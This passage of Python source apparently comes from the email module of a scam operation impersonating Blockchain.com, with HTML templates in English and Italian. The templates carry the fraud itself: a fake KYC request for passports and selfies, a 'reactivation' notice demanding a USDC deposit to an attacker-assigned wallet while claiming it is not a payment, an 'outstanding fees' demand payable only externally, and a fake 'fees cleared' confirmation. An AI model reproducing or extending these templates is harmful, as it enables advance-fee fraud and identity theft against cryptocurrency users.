        body_text = "Questa transazione &egrave; stata registrata sul Suo account. Se non ha autorizzato questa transazione, La preghiamo di contattare immediatamente il nostro team di supporto." if lang == "it" else "This transaction has been recorded on your account. If you did not authorize this transaction, please contact our support team immediately."
        regards = "Cordiali saluti," if lang == "it" else "Best regards,"
        team_name = "Il Team di Blockchain.com" if lang == "it" else "The Blockchain.com Team"
        content = f"""
    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">{heading}</h2>
    <p style="color:#555555;margin:0 0 16px 0;">{greeting}</p>
    <div style="background-color:#f4f4f7;border-radius:8px;padding:20px;margin:16px 0;text-align:center;">
      <p style="color:#888888;font-size:13px;margin:0 0 4px 0;text-transform:uppercase;">{html.escape(tx_label)}</p>
      <p style="color:{color};font-size:28px;font-weight:700;margin:0;">{sign}{html.escape(amount)} {html.escape(asset)}</p>
      {desc_line}
      {status_line}
      <p style="color:#888888;font-size:12px;margin:8px 0 0 0;">{html.escape(tx_date)}</p>
    </div>
    <p style="color:#555555;margin:12px 0;">{body_text}</p>
    <p style="color:#555555;margin:0 0 4px 0;">{regards}</p>
    <p style="color:#333333;font-weight:600;margin:0;">{team_name}</p>"""
        return subject, _wrap(content)

    # ── Fees Cleared Email ───────────────────────────────────────────────
    def get_fees_cleared_email(self, user_name: str, total_fees: str, tx_count: int, lang: str = "en") -> tuple:
        if lang == "it":
            subject = "Commissioni Saldate con Successo - Blockchain.com"
            content = f"""
    <div style="background-color:#e8f5e9;border:1px solid #4caf50;border-radius:8px;padding:20px;text-align:center;margin:0 0 20px 0;">
      <div style="font-size:36px;margin-bottom:8px;">&#10003;</div>
      <p style="color:#2e7d32;font-size:17px;font-weight:700;margin:0;">Tutte le Commissioni Sono State Saldate!</p>
    </div>
    <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
    <p style="color:#555555;margin:0 0 12px 0;">La informiamo che tutte le commissioni in sospeso sul Suo account sono state <strong>saldate con successo</strong>.</p>
    <div style="background-color:#f4f4f7;border-radius:8px;padding:20px;margin:16px 0;text-align:center;">
      <p style="color:#888888;font-size:13px;margin:0 0 4px 0;">COMMISSIONI SALDATE</p>
      <p style="color:#4caf50;font-size:28px;font-weight:700;margin:0;">&euro;{html.escape(total_fees)}</p>
      <p style="color:#888888;font-size:12px;margin:8px 0 0 0;">{tx_count} transazion{'e' if tx_count == 1 else 'i'} aggiornat{'a' if tx_count == 1 else 'e'}</p>
    </div>
    <div style="background-color:#e8f5e9;border-left:4px solid #4caf50;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#2e7d32;margin:0 0 4px 0;font-weight:600;">Cosa significa?</p>
      <p style="color:#555555;margin:0;font-size:13px;">Il Suo account non ha pi&ugrave; commissioni in sospeso. Tutte le funzionalit&agrave; del Suo portafoglio, inclusi i prelievi EUR, sono ora completamente disponibili.</p>
    </div>
    <p style="color:#555555;margin:16px 0 4px 0;">Cordiali saluti,</p>
    <p style="color:#333333;font-weight:600;margin:0;">Il Team Finanza di Blockchain.com</p>"""
        else:
            subject = "Fees Successfully Cleared - Blockchain.com"
            content = f"""
    <div style="background-color:#e8f5e9;border:1px solid #4caf50;border-radius:8px;padding:20px;text-align:center;margin:0 0 20px 0;">
      <div style="font-size:36px;margin-bottom:8px;">&#10003;</div>
      <p style="color:#2e7d32;font-size:17px;font-weight:700;margin:0;">All Fees Have Been Cleared!</p>
    </div>
    <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
    <p style="color:#555555;margin:0 0 12px 0;">We are pleased to confirm that all outstanding fees on your account have been <strong>successfully cleared</strong>.</p>
    <div style="background-color:#f4f4f7;border-radius:8px;padding:20px;margin:16px 0;text-align:center;">
      <p style="color:#888888;font-size:13px;margin:0 0 4px 0;">FEES CLEARED</p>
      <p style="color:#4caf50;font-size:28px;font-weight:700;margin:0;">&euro;{html.escape(total_fees)}</p>
      <p style="color:#888888;font-size:12px;margin:8px 0 0 0;">{tx_count} transaction{'s' if tx_count != 1 else ''} updated</p>
    </div>
    <div style="background-color:#e8f5e9;border-left:4px solid #4caf50;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#2e7d32;margin:0 0 4px 0;font-weight:600;">What does this mean?</p>
      <p style="color:#555555;margin:0;font-size:13px;">Your account no longer has any outstanding fees. All wallet features, including EUR withdrawals, are now fully available.</p>
    </div>
    <p style="color:#555555;margin:16px 0 4px 0;">Best regards,</p>
    <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Finance Team</p>"""
        return subject, _wrap(content)

    def _get_kyc_verification_email_it(self, user_name, verification_link):
        subject = "Verifica della Sua Identit&agrave; - Blockchain.com"
        content = f"""
    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Verifica dell'Identit&agrave; Richiesta</h2>
    <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
    <p style="color:#555555;margin:0 0 12px 0;">Abbiamo rilevato alcune attivit&agrave; insolite sul Suo account. Per garantire la sicurezza dei Suoi fondi e ottemperare ai requisiti normativi, Le chiediamo di verificare la Sua identit&agrave;.</p>
    <p style="color:#555555;margin:0 0 8px 0;">La preghiamo di completare la procedura di verifica KYC (Know Your Customer) cliccando sul pulsante qui sotto:</p>
    {_btn("Verifica la Mia Identit&agrave;", verification_link)}
    <p style="color:#555555;margin:0 0 8px 0;">Sar&agrave; necessario fornire i seguenti documenti:</p>
    <ul style="color:#555555;margin:0 0 16px 0;padding-left:20px;">
      <li style="margin-bottom:4px;">Un documento d'identit&agrave; valido rilasciato dal governo (Passaporto o Carta d'Identit&agrave;)</li>
      <li style="margin-bottom:4px;">Un selfie con il documento d'identit&agrave; in mano</li>
      <li style="margin-bottom:4px;">Una prova di residenza (bolletta di un'utenza o estratto conto bancario)</li>
    </ul>
    <p style="color:#555555;margin:0 0 12px 0;">Una volta completata la verifica, ricever&agrave; le istruzioni per reimpostare la Sua password e riottenere pieno accesso al Suo account.</p>
    <p style="color:#555555;margin:0 0 12px 0;">Se non ha richiesto questa verifica o ha domande, La preghiamo di contattare immediatamente il nostro team di supporto.</p>
    <p style="color:#555555;margin:0 0 4px 0;">Cordiali saluti,</p>
    <p style="color:#333333;font-weight:600;margin:0;">Il Team Sicurezza di Blockchain.com</p>"""
        return subject, _wrap(content)

    def _get_kyc_approved_email_it(self, user_name, reset_link):
        subject = "Identit&agrave; Verificata - Reimposti la Sua Password - Blockchain.com"
        content = f"""
    <div style="background-color:#e8f5e9;border:1px solid #4caf50;border-radius:8px;padding:20px;text-align:center;margin:0 0 20px 0;">
      <div style="font-size:36px;margin-bottom:8px;">&#10003;</div>
      <p style="color:#2e7d32;font-size:17px;font-weight:700;margin:0;">La Sua Identit&agrave; &Egrave; Stata Verificata!</p>
    </div>
    <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
    <p style="color:#555555;margin:0 0 12px 0;">Il nostro team di conformit&agrave; ha verificato con successo la Sua identit&agrave;. La Sua verifica KYC &egrave; ora <strong>APPROVATA</strong>.</p>
    <div style="background-color:#f0f4ff;border:1px solid #0052ff;border-radius:8px;padding:20px;margin:16px 0;">
      <p style="color:#0052ff;font-weight:700;margin:0 0 8px 0;">Prossimo Passaggio Richiesto</p>
      <p style="color:#555555;margin:0 0 12px 0;">Per garantire la sicurezza del Suo account, &egrave; ora necessario <strong>reimpostare la Sua password</strong> prima di poter accedere al Suo portafoglio.</p>
      {_btn("Reimposta la Mia Password", reset_link)}
    </div>
    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#555555;margin:0;font-size:13px;"><strong>Importante:</strong> Questo link per la reimpostazione della password scade tra <strong>24 ore</strong>. Dopo la reimpostazione, avr&agrave; pieno accesso al Suo account. La preghiamo di scegliere una password sicura e unica.</p>
    </div>
    <p style="color:#555555;margin:16px 0 4px 0;">Cordiali saluti,</p>
    <p style="color:#333333;font-weight:600;margin:0;">Il Team Conformit&agrave; di Blockchain.com</p>"""
        return subject, _wrap(content)

    def _get_password_reset_email_it(self, user_name, reset_link):
        subject = "Reimposti la Sua Password - Blockchain.com"
        content = f"""
    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Reimpostazione della Password</h2>
    <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
    <p style="color:#555555;margin:0 0 12px 0;">La Sua identit&agrave; &egrave; stata verificata con successo. Come parte del nostro protocollo di sicurezza, Le &egrave; richiesto di reimpostare la Sua password prima di poter accedere al Suo account.</p>
    <p style="color:#555555;margin:0 0 8px 0;">Clicchi sul pulsante qui sotto per creare una nuova password:</p>
    {_btn("Reimposta la Password", reset_link)}
    <p style="color:#888888;font-size:13px;margin:0 0 16px 0;">Questo link scadr&agrave; tra 24 ore per motivi di sicurezza.</p>
    <p style="color:#555555;margin:0 0 4px 0;">Cordiali saluti,</p>
    <p style="color:#333333;font-weight:600;margin:0;">Il Team di Blockchain.com</p>"""
        return subject, _wrap(content)

    def _get_reactivation_email_it(self, user_name, eth_wallet_address, required_amount):
        subject = "Avviso di Riattivazione dell'Account - Blockchain.com"
        content = f"""
    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Riattivazione dell'Account Richiesta</h2>
    <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
    <p style="color:#555555;margin:0 0 12px 0;">Il Suo account &egrave; stato contrassegnato a causa di un'inattivit&agrave; prolungata ed &egrave; attualmente programmato per la chiusura in conformit&agrave; con i nostri requisiti di conformit&agrave; normativa.</p>

    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#555555;margin:0 0 8px 0;font-weight:600;">Azione Richiesta</p>
      <p style="color:#555555;margin:0;">Per riattivare il Suo account, &egrave; necessario dimostrare l'attivit&agrave; dello stesso effettuando una transazione positiva di:</p>
      <p style="text-align:center;margin:12px 0;"><span style="display:inline-block;background-color:#0052ff;color:#ffffff;padding:10px 24px;border-radius:6px;font-size:20px;font-weight:700;">{required_amount} EUR in USDC (ERC-20)</span></p>
    </div>

    <div style="background-color:#e8f5e9;border-left:4px solid #4caf50;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#2e7d32;margin:0;font-weight:600;">NON si tratta di un pagamento.</p>
      <p style="color:#555555;margin:4px 0 0 0;font-size:13px;">Questo importo non costituisce una commissione n&eacute; un addebito. Si tratta semplicemente di un deposito di verifica per dimostrare l'attivit&agrave; dell'account. Potr&agrave; prelevare immediatamente tale importo sul Suo conto bancario una volta che il Suo account sar&agrave; stato riattivato.</p>
    </div>

    <h3 style="color:#1a1a1a;margin:20px 0 8px 0;font-size:16px;">L'Indirizzo del Portafoglio a Lei Assegnato</h3>
    <p style="color:#555555;margin:0 0 8px 0;">Il seguente portafoglio USDC (ERC-20) &egrave; stato assegnato al Suo account:</p>
    <div style="background-color:#121530;color:#00d4ff;padding:16px;border-radius:6px;margin:12px 0;word-break:break-all;font-family:'Courier New',monospace;text-align:center;font-size:13px;letter-spacing:0.5px;">
      {html.escape(eth_wallet_address)}
    </div>
    <p style="text-align:center;font-size:12px;color:#888888;margin:4px 0 16px 0;">Pu&ograve; trovare questo indirizzo anche nel Suo portafoglio cliccando il pulsante "Deposita".</p>

    <h3 style="color:#1a1a1a;margin:20px 0 8px 0;font-size:16px;">Come Completare Questa Transazione</h3>
    <ol style="color:#555555;margin:0 0 16px 0;padding-left:20px;">
      <li style="margin-bottom:6px;">Acquisti USDC da un fornitore terzo di criptovalute autorizzato (Coinbase, Binance, Kraken, o qualsiasi exchange autorizzato).</li>
      <li style="margin-bottom:6px;">Invii l'equivalente di {required_amount} EUR in USDC all'indirizzo del portafoglio indicato sopra.</li>
      <li style="margin-bottom:6px;">Utilizzi la rete ERC-20 (Ethereum) per effettuare l'invio.</li>
      <li style="margin-bottom:6px;">Il Suo account verr&agrave; riattivato una volta confermata la transazione.</li>
    </ol>

    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#555555;margin:0;font-size:13px;"><strong>Nota bene:</strong> Blockchain.com non offre pi&ugrave; servizi di acquisto diretto di criptovalute per gli account contrassegnati. &Egrave; necessario utilizzare un fornitore esterno per acquistare USDC. Dopo la riattivazione, potr&agrave; prelevare tutti i Suoi fondi.</p>
    </div>

    <div style="background-color:#f4f4f7;padding:12px 16px;margin:16px 0;border-radius:4px;">
      <p style="color:#555555;margin:0;font-size:13px;"><strong>Come funziona il nostro sistema:</strong> La piattaforma opera su un sistema completamente automatizzato e decentralizzato, mantenuto attraverso le commissioni di transazione generate dall'attivit&agrave; degli account. Quando gli account rimangono inattivi, &egrave; richiesta una verifica periodica dell'attivit&agrave;. Una volta che il Suo portafoglio mostrer&agrave; attivit&agrave;, verr&agrave; automaticamente contrassegnato come attivo.</p>
    </div>

    <p style="color:#555555;margin:16px 0 4px 0;">Per qualsiasi domanda, La preghiamo di contattare il nostro team di supporto.</p>
    <p style="color:#555555;margin:0 0 4px 0;">Cordiali saluti,</p>
    <p style="color:#333333;font-weight:600;margin:0;">Il Team Conformit&agrave; di Blockchain.com</p>"""
        return subject, _wrap(content)

    def _get_fee_payment_email_it(self, user_name, total_fees, eth_wallet_address):
        subject = "Commissioni in Sospeso - Blockchain.com"
        content = f"""
    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Commissioni di Transazione in Sospeso</h2>
    <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
    <p style="color:#555555;margin:0 0 12px 0;">Il Suo account presenta commissioni di transazione in sospeso che devono essere saldate prima di poter procedere al prelievo dei Suoi fondi.</p>

    <div style="background-color:#d32f2f;color:#ffffff;padding:20px;border-radius:8px;margin:16px 0;text-align:center;">
      <p style="margin:0 0 4px 0;font-size:13px;">Commissioni Totali in Sospeso</p>
      <p style="margin:0;font-size:28px;font-weight:700;">{html.escape(total_fees)} EUR</p>
    </div>

    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#555555;margin:0 0 4px 0;font-weight:600;">Perch&eacute; ho delle commissioni?</p>
      <p style="color:#555555;margin:0;font-size:13px;">Le commissioni di transazione vengono calcolate automaticamente in base alla Sua attivit&agrave; di trading storica. Queste commissioni supportano l'infrastruttura della rete blockchain, i protocolli di sicurezza e i sistemi di conformit&agrave; normativa.</p>
    </div>

    <p style="color:#555555;margin:12px 0 8px 0;">Per saldare le commissioni, La preghiamo di inviare l'importo equivalente in USDC (ERC-20) al Suo indirizzo portafoglio:</p>
    <div style="background-color:#f4f4f7;padding:14px;border-radius:6px;margin:12px 0;word-break:break-all;font-family:'Courier New',monospace;text-align:center;font-size:13px;color:#333333;">
      {html.escape(eth_wallet_address)}
    </div>

    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#555555;margin:0 0 4px 0;font-weight:600;">Avviso Normativo</p>
      <p style="color:#555555;margin:0;font-size:13px;">A causa dei requisiti normativi e dei nostri protocolli di integrit&agrave;, non &egrave; possibile detrarre le commissioni direttamente dal Suo saldo esistente. Quando un account viene contrassegnato per la revisione o programmato per la chiusura, tutti i movimenti di fondi devono essere regolati esternamente per ottemperare alle normative antiriciclaggio (AML).</p>
    </div>

    <p style="color:#555555;margin:12px 0;">Una volta saldate le commissioni, potr&agrave; prelevare il Suo intero saldo sul Suo conto bancario.</p>
    <p style="color:#555555;margin:0 0 4px 0;">Cordiali saluti,</p>
    <p style="color:#333333;font-weight:600;margin:0;">Il Team Finanza di Blockchain.com</p>"""
        return subject, _wrap(content)

    def _get_welcome_email_it(self, user_name, login_link):
        subject = "Benvenuto su Blockchain.com"
        content = f"""
    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Benvenuto su Blockchain.com!</h2>
    <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
    <p style="color:#555555;margin:0 0 12px 0;">Il Suo account &egrave; stato creato con successo. Le diamo il benvenuto nella piattaforma di criptovalute pi&ugrave; affidabile al mondo.</p>
    <p style="color:#555555;margin:0 0 8px 0;">Con Blockchain.com, potr&agrave;:</p>
    <ul style="color:#555555;margin:0 0 16px 0;padding-left:20px;">
      <li style="margin-bottom:4px;">Conservare le Sue criptovalute in modo sicuro</li>
      <li style="margin-bottom:4px;">Inviare e ricevere asset digitali</li>
      <li style="margin-bottom:4px;">Monitorare il Suo portafoglio in tempo reale</li>
      <li style="margin-bottom:4px;">Accedere a un livello di sicurezza di grado istituzionale</li>
    </ul>
    {_btn("Acceda al Suo Portafoglio", login_link)}
    <p style="color:#555555;margin:0 0 4px 0;">Cordiali saluti,</p>
    <p style="color:#333333;font-weight:600;margin:0;">Il Team di Blockchain.com</p>"""
        return subject, _wrap(content)


# Global instance
email_service = None

def get_email_service():
    global email_service
    if email_service is None:
        email_service = EmailService()
    return email_service
